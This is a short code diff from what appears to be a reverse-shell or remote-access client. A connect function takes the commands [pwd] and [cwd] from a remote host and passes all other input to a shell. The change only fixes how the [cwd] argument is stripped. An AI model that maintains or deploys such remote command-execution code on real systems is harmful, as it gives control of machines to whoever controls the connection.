@@ -354,7 +354,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             elif "[pwd]" in data:
                 send_data(conn, getcwd())
             elif "[cwd]" in data:
-                send_data(conn,change_cwd(data.lstrip("[cwd]")))
+                send_data(conn,change_cwd(data.lstrip("[cwd] ")))
             else: # otherwise, we pass the received command to a shell process
                 #cmds = data.split()
                 if VERBOSE:
